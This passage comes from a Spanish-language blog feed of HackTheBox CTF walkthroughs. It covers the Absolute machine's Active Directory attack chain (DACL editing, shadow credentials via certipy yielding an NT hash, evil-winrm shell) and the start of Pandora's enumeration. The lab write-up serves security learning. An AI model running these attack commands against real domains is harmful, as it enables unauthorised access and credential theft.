SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared          READ
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos para ver que hay dentro de <code class="language-plaintext highlighter-rouge">shared</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient <span class="nt">-k</span> absolute.htb/svc_smb:<span class="s1">'AbsoluteSMBService123!'</span>@dc.absolute.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Shared</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 <span class="nb">.</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 ..
<span class="nt">-rw-rw-rw-</span>         72  Thu Sep  1 12:02:23 2022 compiler.sh
<span class="nt">-rw-rw-rw-</span>      67584  Thu Sep  1 12:02:23 2022 test.exe
</code></pre></div></div>

<ul>
  <li>Vamos a descargar los 2 archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading compiler.sh
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading test.exe
</code></pre></div></div>

<ul>
  <li>Tenemos un ejecutable y un script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content file test.exe
test.exe: PE32+ executable <span class="o">(</span>GUI<span class="o">)</span> x86-64 <span class="o">(</span>stripped to external PDB<span class="o">)</span>, <span class="k">for </span>MS Windows, 11 sections
➜  content <span class="nb">cat </span>compiler.sh
<span class="c">#!/bin/bash</span>

nim c <span class="nt">-d</span>:mingw <span class="nt">--app</span>:gui <span class="nt">--cc</span>:gcc <span class="nt">-d</span>:danger <span class="nt">-d</span>:strip <span class="nv">$1</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> la <code class="language-plaintext highlighter-rouge">IP</code> y dominios de la máquina victima.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/hosts.png" />
</p>

<ul>
  <li>Vamos correr la <code class="language-plaintext highlighter-rouge">VPN</code> de <code class="language-plaintext highlighter-rouge">HackTheBox</code> en la máquina <code class="language-plaintext highlighter-rouge">Windows</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/vpn.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a pasar el <code class="language-plaintext highlighter-rouge">.exe</code> a la máquina Windows.</p>
  </li>
  <li>
    <p>Como no sabemos que hace el <strong>.exe</strong> vamos a ponernos a interceptar el trafico con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>
  </li>
  <li>
    <p>Al momento de ejecutar el binario y estar capturando con <code class="language-plaintext highlighter-rouge">Wireshark</code> encontramos credenciales.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/creds.png" />
</p>

<ul>
  <li>Nos dice que no son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'mlovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>lovegod: KDC_ERR_C_PRINCIPAL_UNKNOWN
</code></pre></div></div>

<ul>
  <li>Si les ponemos un punto funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb absolute.htb <span class="nt">-u</span> <span class="s1">'m.lovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         absolute.htb    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
</code></pre></div></div>

<ul>
  <li>Para enumerar el <code class="language-plaintext highlighter-rouge">DC</code> vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> m.lovegod <span class="nt">-p</span> AbsoluteLDAP2022! <span class="nt">-k</span> <span class="nt">-c</span> All <span class="nt">-d</span> absolute.htb <span class="nt">-dc</span> dc.absolute.htb <span class="nt">-ns</span> 10.10.11.181 <span class="nt">--zip</span>
INFO: Found AD domain: absolute.htb
INFO: Getting TGT <span class="k">for </span>user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 <span class="nb">users
</span>INFO: Found 55 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done <span class="k">in </span>00M 23S
INFO: Compressing output into 20240618211316_bloodhound.zip
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">sudo </span>neo4j start
Directories <span class="k">in </span>use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j <span class="o">(</span>pid:39754<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
There may be a short delay <span class="k">until </span>the server is ready.

➜  ~ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>

<ul>
  <li>Vamos a marcar los usuarios que ya tenemos comprometidos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/klay.png" />
</p>

<ul>
  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Shortest Paths</code> y seleccionamos el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> encontramos una forma de convertirnos en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/4.png" />
</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">m.lovegod</code> tiene el privilegio <code class="language-plaintext highlighter-rouge">owns</code> en el grupo <code class="language-plaintext highlighter-rouge">GenericWrite</code>.</li>
</ul>

<blockquote>
  <p>El privilegio “Owns” dentro del grupo “GenericWrite” le otorga al usuario la capacidad de modificar la mayoría de los atributos del objeto, administrar el objeto y delegar permisos a otros usuarios, con ciertas excepciones.</p>
</blockquote>

<ul>
  <li>El usuario el cual es nuestro objetivo es parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/5.png" />
</p>

<h2 id="mlovegod-to-network-audit">m.lovegod to Network Audit</h2>

<ul>
  <li>Estuve muchas horas tratando de solucionar los errores para empezar tuve que hacer los mismos pasos 3 veces para llegar a obtener el hash NT de <strong>winrm_user</strong> pero esto fue lo que hice.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/resolv.conf
<span class="c"># Generated by NetworkManager</span>
nameserver 10.10.11.181
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /usr/share/samba/setup/krb5.conf
<span class="o">[</span>libdefaults]
	default_realm <span class="o">=</span> ABSOLUTE.HTB
	dns_lookup_realm <span class="o">=</span> <span class="nb">false
	</span>dns_lookup_kdc <span class="o">=</span> <span class="nb">true</span>

<span class="o">[</span>realms]
<span class="k">${</span><span class="nv">REALM</span><span class="k">}</span> <span class="o">=</span> ABSOLUTE.HTB <span class="o">=</span> <span class="o">{</span>
		kdc <span class="o">=</span> dc.absolute.htb
		admin_server <span class="o">=</span> dc.absolute.htb
		default_domain <span class="o">=</span> absolute.htb
	  <span class="o">}</span>

<span class="o">[</span>domain_realm]
	<span class="k">${</span><span class="nv">HOSTNAME</span><span class="k">}</span> <span class="o">=</span> <span class="k">${</span><span class="nv">REALM</span><span class="k">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">bloodhound</code> nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s</a> para agregar al usuario.</p>
  </li>
  <li>
    <p>También podemos hacerlo desde nuestra máquina Linux con los pasos que nos dicen en bloodhound.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/f.png" />
</p>

<ul>
  <li>
    <p><a href="https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py">https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py</a></p>
  </li>
  <li>
    <p><a href="https://github.com/ShutdownRepo/impacket.git">https://github.com/ShutdownRepo/impacket.git</a>.</p>
  </li>
  <li>
    <p>Ahora obtendremos control total del grupo Network Audit para el usuario m.lovegod.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 dacledit.py <span class="nt">-k</span> <span class="nt">-no-pass</span> absolute.htb/m.lovegod <span class="nt">-dc-ip</span> dc.absolute.htb <span class="nt">-principal</span> m.lovegod <span class="nt">-target</span> <span class="s2">"Network Audit"</span> <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL backed up to dacledit-20240619-000424.bak
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL modified successfully!
</code></pre></div></div>

<ul>
  <li>Ahora agregamos el usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group addmem <span class="s2">"Network Audit"</span> m.lovegod <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
</code></pre></div></div>

<ul>
  <li>Comprobamos que el usuario esta en el grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group members <span class="s2">"Network Audit"</span> <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
absolute<span class="se">\m</span>.lovegod
absolute<span class="se">\s</span>vc_audit
</code></pre></div></div>

<ul>
  <li>Ahora vamos a generar un TGT y lo exportamos como variable para después autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>m.lovegod.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
</code></pre></div></div>

<ul>
  <li>En este punto deberíamos de tener <code class="language-plaintext highlighter-rouge">GenericWrite</code> en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> podemos usar <code class="language-plaintext highlighter-rouge">certipy</code> para obtener el <code class="language-plaintext highlighter-rouge">TGT</code> del usuario <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad shadow auto <span class="nt">-u</span> absolute.htb/m.lovegod@dc.absolute.htb <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target</span> dc.absolute.htb <span class="nt">-account</span> winrm_user
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'winrm_user'</span> with the certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: winrm_user@absolute.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'winrm_user.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>: 8738c7413a5da3bc1d083efc0ab06cb2
</code></pre></div></div>

<h2 id="winrm_user">winrm_user</h2>

<ul>
  <li>Ahora nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
➜  content evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
7db70aea6e4e1e5f4b858e1136fdc263
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>
    <p>Para enumerar el sistema podemos usar winpeas <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a>.</p>
  </li>
  <li>
    <p>La máquina en lo persona falla demasiado así que tuve que hacer lo mismo varias veces hasta para ejecutar el <code class="language-plaintext highlighter-rouge">winPEASx64.exe</code>.</p>
  </li>
  <li>
    <p>Tenia mucho este error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc_consolidate<span class="o">()</span>: unaligned fastbin chunk detected
<span class="o">[</span>1]    109301 IOT instruction  evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Gatogamer_account/Absolute/content/winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/Absolute/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos que hacer esta explotación <a href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/zi.png" />
</p>

<h2 id="ultima-parte">Ultima parte</h2>

<blockquote>
  <p>Como la máquina me esta dando demasiados errores la escalada de privilegios que consiste en hacer un KrbRelay la pueden encuntrar en el post de mi compañero <a href="https://xchg2pwn.github.io/hackthebox/absolute/">https://xchg2pwn.github.io/hackthebox/absolute/</a></p>
</blockquote>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Pandora (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora.html" rel="alternate" type="text/html" title="HackTheBox - Pandora (easy)" /><published>2024-06-19T00:00:00-06:00</published><updated>2024-06-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6ac0e76002774bbfac92b0dbc86cb6af.png" />
</p>

<ul>
  <li>Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user <code class="language-plaintext highlighter-rouge">daniel</code>. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called <code class="language-plaintext highlighter-rouge">matt</code> is achieved by chaining SQL injection RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user <code class="language-plaintext highlighter-rouge">root</code> is performed by exploiting a SUID binary for PATH variable injection.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Escaneamos los puertos abiertos por el protocolo TCP y sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.136 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.136
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span class="o">(</span>RSA<span class="o">)</span>
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estas son las tecnologías que están corriendo en el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">41</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">contact</span><span class="vi">@panda</span><span class="p">.</span><span class="nf">htb</span><span class="p">,</span><span class="n">example</span><span class="vi">@yourmail</span><span class="p">.</span><span class="nf">com</span><span class="p">,</span><span class="n">support</span><span class="vi">@panda</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">41</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span><span class="p">],</span> <span class="no">Open</span><span class="o">-</span><span class="no">Graph</span><span class="o">-</span><span class="no">Protocol</span><span class="p">[</span><span class="n">website</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Play</span> <span class="o">|</span> <span class="no">Landing</span><span class="p">],</span> <span class="n">probably</span> <span class="no">WordPress</span><span class="p">,</span> <span class="no">X</span><span class="o">-</span><span class="no">UA</span><span class="o">-</span><span class="no">Compatible</span><span class="p">[</span><span class="no">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la página web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/1.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap feroxbuster <span class="nt">-u</span> http://10.10.11.136 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.136
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
200      GET       35l      183w    14785c http://10.10.11.136/assets/images/testimonials/author-03.png
200      GET        1l      111w     1965c http://10.10.11.136/assets/images/logo/logo.svg
200      GET        1l      350w    10753c http://10.10.11.136/assets/images/brands/graygrids.svg
200      GET       33l      171w    13994c http://10.10.11.136/assets/images/testimonials/author-01.png
200      GET        1l      230w     6015c http://10.10.11.136/assets/images/footer/brands/lineicons.svg
200      GET       27l      174w    14698c http://10.10.11.136/assets/images/testimonials/author-02.png
200      GET        1l      730w     7340c http://10.10.11.136/assets/images/hero/dotted-shape.svg
200      GET      234l      437w     4182c http://10.10.11.136/assets/css/animate.css
200      GET        1l      609w     8493c http://10.10.11.136/assets/images/footer/shape-2.svg
200      GET        9l       35w      429c http://10.10.11.136/assets/images/footer/shape-1.svg
200      GET        9l       35w      474c http://10.10.11.136/assets/images/footer/shape-3.svg
200      GET       27l       32w    48044c http://10.10.11.136/assets/css/ud-styles.css.map
200      GET        4l       31w      380c http://10.10.11.136/assets/images/404/shape-1.svg
200      GET        4l       31w      384c http://10.10.11.136/assets/images/404/shape-2.svg
200      GET        1l      155w     1625c http://10.10.11.136/assets/images/404/dotted-shape.svg
200      GET        1l       31w      622c http://10.10.11.136/assets/images/faq/shape.svg
200      GET        1l      111w     1968c http://10.10.11.136/assets/images/logo/logo-2.svg
200      GET        7l     1994w   162720c http://10.10.11.136/assets/css/bootstrap.min.css
301      GET        9l       28w      313c http://10.10.11.136/assets <span class="o">=&gt;</span> http://10.10.11.136/assets/
200      GET        3l      148w     8157c http://10.10.11.136/assets/js/wow.min.js
200      GET       78l      139w     1147c http://10.10.11.136/assets/scss/_about.scss
200      GET       93l      254w     2626c http://10.10.11.136/assets/js/main.js
200      GET      502l      801w     7736c http://10.10.11.136/assets/scss/_blog-details.scss
200      GET      122l      211w     2138c http://10.10.11.136/assets/scss/_pricing.scss
200      GET       29l       56w      536c http://10.10.11.136/assets/scss/ud-styles.scss
200      GET      132l      223w     2004c http://10.10.11.136/assets/scss/_contact.scss
200      GET       31l       82w      459c http://10.10.11.136/assets/scss/_default.scss
200      GET      155l      241w     2354c http://10.10.11.136/assets/scss/_footer.scss
200      GET       99l      175w     1471c http://10.10.11.136/assets/scss/_404.scss
200      GET      297l      529w     5316c http://10.10.11.136/assets/scss/_header.scss
200      GET      179l      282w     2711c http://10.10.11.136/assets/scss/_common.scss
200      GET      106l      166w     1676c http://10.10.11.136/assets/scss/_testimonials.scss
200      GET      138l      221w     2016c http://10.10.11.136/assets/scss/_hero.scss
200      GET      110l      178w     1858c http://10.10.11.136/assets/scss/_features.scss
200      GET       81l      131w     1226c http://10.10.11.136/assets/scss/_team.scss
200      GET       97l      150w     1467c http://10.10.11.136/assets/scss/_blog.scss
200      GET       73l      122w     1416c http://10.10.11.136/assets/scss/_mixin.scss
200      GET      110l      174w     1783c http://10.10.11.136/assets/scss/_login.scss
200      GET        7l     1019w    78468c http://10.10.11.136/assets/js/bootstrap.bundle.min.js
200      GET      254l     1427w   113210c http://10.10.11.136/assets/fonts/LineIcons.woff2
200      GET     2001l     7262w   150863c http://10.10.11.136/assets/fonts/LineIcons.ttf
200      GET      327l     1717w   138665c http://10.10.11.136/assets/fonts/LineIcons.woff
200      GET     2001l     7264w   151045c http://10.10.11.136/assets/fonts/LineIcons.eot
200      GET        1l      339w     6616c http://10.10.11.136/assets/images/brands/uideck.svg
200      GET        1l      224w    10862c http://10.10.11.136/assets/images/footer/brands/graygrids.svg
200      GET        1l       77w     1328c http://10.10.11.136/assets/images/favicon.svg
200      GET        1l      467w    11946c http://10.10.11.136/assets/images/brands/ecommerce-html.svg
200      GET        1l       87w     1454c http://10.10.11.136/assets/images/brands/ayroui.svg
